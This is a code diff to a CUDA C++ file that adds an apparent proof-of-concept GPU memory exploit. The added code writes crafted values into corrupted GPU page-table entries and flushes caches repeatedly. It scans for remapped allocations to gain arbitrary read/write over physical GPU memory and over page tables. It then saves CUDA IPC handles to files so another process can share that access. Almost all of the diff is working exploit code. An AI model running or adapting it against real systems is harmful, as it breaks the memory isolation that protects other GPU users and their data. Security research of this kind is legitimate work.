@@ -2,6 +2,14 @@
 #include "sc_secondRegion.cuh"
 #include <chrono>
 #include <thread>
+#include <fstream>
+
+struct CudaSharedMemHandles {
+    size_t pt_ofs;
+
+    cudaIpcMemHandle_t pt_handle;
+    cudaIpcMemHandle_t arb_handle;
+}__attribute__((__packed__));
 
 bool
 second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
@@ -37,7 +45,7 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
       // DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;
       std::cout << i << " New PT time: " << currentMS << " ms" << std::endl;
 
-      if (i < skip || i % 512 == 0)
+      if (i < skip || i % 511 == 0)
         continue;
 
       if (i == next_id)
@@ -50,6 +58,226 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
                "Region: Press \033[1;32mEnter Key\033[0m to continue..."
             << '\n';
   pause ();
+
+  std::cout << "ok"
+            << '\n';
+
+  std::vector<uint8_t*> fourkb_pages;
+  for (uint64_t i = 0; i < 225; i += 1)
+    {
+      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
+
+      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
+      fourkb_pages.push_back(temp);
+      std::cout << i << " New PT time: " << currentMS << " ms" << std::endl;
+    }
+  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+  {
+    if (i != out_corrupt_id && i != out_victim_id)
+      cudaFree(region_ptrs[i]);
+    gpuErrchk(cudaPeekAtLastError());
+  }
+  std::vector<void*> cm_ptrs(8000);
+  for (uint64_t i = 0; i < 8000; i += 1)
+    {
+      cudaMalloc(&cm_ptrs[i], ALLOC_SIZE);
+      // time_data_access ((uint8_t*)cm_ptrs[i], ALLOC_SIZE);
+      memset_ptr<<<1,1>>>((uint8_t*)cm_ptrs[i], (uint64_t)cm_ptrs[i], 8);
+    }
+  print_memory<<<1,1>>>(corrupted_ptr, 64 * 1024);
+  cudaDeviceSynchronize();
+
+  std::cout << (void*)(temp + ALLOC_SIZE) << '\n';
+  pause();
+  /*****************/
+  char * flush_ptr;
+  uint8_t *data_device_ptr;
+  uint64_t flush_size = 3L * 1024 * 1024 * 1024;
+  cudaMallocManaged(&flush_ptr, flush_size);
+  cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);
+
+  initialize_memory_loop<<<1,1>>>((uint8_t*)flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+  gpuErrchk(cudaPeekAtLastError());
+
+  // Generate 64KB Pages
+  gen_64KB(flush_ptr, flush_size);
+
+  // Flush
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+  gpuErrchk(cudaPeekAtLastError());
+
+  std::cout << "ok"
+            << '\n';
+  // find virtual address of the 4KB frame
+
+  uint64_t arb_rw_ofs;
+  void* arb_rw_orig_ptr = nullptr;
+  void* arb_rw_ptr = nullptr;
+  void* pt_rw_orig_ptr = nullptr;
+
+  // cudaMemcpyArray(corrupted_ptr + 0xc100, data_device_ptr, 8);
+  cudaMemcpyArray(data_device_ptr, corrupted_ptr + 0xc100, 8);
+  arb_rw_orig_ptr = *(void**)data_device_ptr;
+
+  cudaMemcpyArray(data_device_ptr, corrupted_ptr + 0xc110, 8);
+  pt_rw_orig_ptr = *(void**)data_device_ptr;
+
+  memset_ptr<<<1,1>>>(corrupted_ptr + 0xc100, (uint64_t)(0x60000000000001), 8);
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+  gpuErrchk(cudaPeekAtLastError());
+  
+  for (int j = 0; j < cm_ptrs.size(); j++)
+  {
+    cudaMemcpyArray(data_device_ptr, (uint8_t*)cm_ptrs[j], 8);
+    if (*(void**)data_device_ptr !=  (void *)cm_ptrs[j])
+    {
+      std::cout << "Arb:" << (void *)cm_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
+      arb_rw_ptr = (void *)cm_ptrs[j];
+      arb_rw_ofs = j;
+      break;
+    }
+  }
+
+  std::cout << "ok" << '\n';
+  pause();
+  // find physical location of pointer_to_find
+  uint64_t it_ptr = (uint64_t)(0x60000000000001);
+  uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024);
+  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
+    {
+      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
+      {
+        // gen_64KB(flush_ptr, flush_size);
+        
+        memset_ptr<<<1,1>>>(corrupted_ptr + 0xc100, it_ptr, 8);
+        cudaDeviceSynchronize();
+        simple_flush<<<1,1>>>(flush_ptr, flush_size);
+        cudaDeviceSynchronize();
+        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
+        // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
+        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        if (*(void**)data_device_ptr == (void*)it_ptr)
+        {
+          std::cout << *(void**)data_device_ptr << '\n';
+          break;
+        }
+        cudaDeviceSynchronize();
+        gpuErrchk(cudaPeekAtLastError());
+
+        
+      }
+      it_ptr += 0x20000;
+    }
+  pause();
+  uint64_t pt_entry_phys = it_ptr;
+  void* pt_rw_ptr = nullptr;
+  uint64_t pt_rw_ofs;
+  // Set another cudaMalloc to this:
+  memset_ptr<<<1,1>>>(corrupted_ptr + 0xc110, pt_entry_phys, 8);
+  cudaDeviceSynchronize();
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+
+  for (int j = 0; j < cm_ptrs.size(); j++)
+  {
+    cudaMemcpyArray(data_device_ptr, (uint8_t*)cm_ptrs[j], 8);
+    if ((void *)cm_ptrs[j] != arb_rw_ptr && *(void**)data_device_ptr !=  (void *)cm_ptrs[j])
+    {
+      std::cout << "PT rw:" << (void *)cm_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
+      pt_rw_ptr = (void *)cm_ptrs[j];
+      pt_rw_ofs = j;
+      break;
+    }
+  }
+
+  CudaSharedMemHandles data;
+
+  data.pt_ofs = target_pte_ofs;
+
+  cudaIpcGetMemHandle(&data.pt_handle, pt_rw_ptr);
+  cudaIpcGetMemHandle(&data.arb_handle, arb_rw_ptr);
+
+  std::ofstream file("cuda_ipc_handles.bin", std::ios::binary);
+  file.write(reinterpret_cast<char*>(&data), sizeof(data));
+  file.close();
+
+  cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + data.pt_ofs, 8);
+  std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
+  cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
+  std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
+
+  std::cout << "Wrote CUDA IPC handles to file\n";
+  pause();
+
+  // find orig pte entries:
+  //   for pt, make it the arb's physical location + offset
+  uint64_t arb_location = 0;
+  uint64_t pt_location = 0;
+  uint64_t arb_location_ofs = 0;
+  uint64_t pt_location_ofs = 0;
+  it_ptr = (uint64_t)(0x60000000000001);
+  for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
+    {
+      if (i > (uint64_t)12L * 1024 * 1024 * 1024)
+      {
+        memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + data.pt_ofs, it_ptr, 8);
+        cudaDeviceSynchronize();
+        simple_flush<<<1,1>>>(flush_ptr, flush_size);
+        cudaDeviceSynchronize();
+
+        cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
+        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        for (int z = 0; z < 2L * 1024 * 1024; z+=8)
+        {
+          if (*(void**)(data_device_ptr + z) == arb_rw_orig_ptr)
+          {
+            arb_location = it_ptr;
+            arb_location_ofs = z;
+            std::cout << "Found" << '\n';
+          }
+          if (*(void**)(data_device_ptr + z) == pt_rw_orig_ptr)
+          {
+            pt_location = it_ptr;
+            pt_location_ofs = z;
+            std::cout << "Found" << '\n';
+          }
+        }
+        
+        if (arb_location != 0 && pt_location != 0)
+        {
+          break;
+        }
+        cudaDeviceSynchronize();
+        gpuErrchk(cudaPeekAtLastError());   
+      }
+      it_ptr += 0x20000;
+    }
+  pause();
+
+  // set new pt rw ptr to the PT's 2MB page
+  // pass new arb_location offset through file.
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+
+  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + data.pt_ofs, pt_location, 8);
+  cudaDeviceSynchronize();
+
+  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
+  cudaDeviceSynchronize();
+
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+
+  data.pt_ofs = arb_location_ofs;
+  std::ofstream new_ofs_file("new_offset.bin", std::ios::binary);
+  new_ofs_file.write(reinterpret_cast<char*>(&data), sizeof(data));
+  new_ofs_file.close();
+
+  pause();
+
   return 0;
 }
 
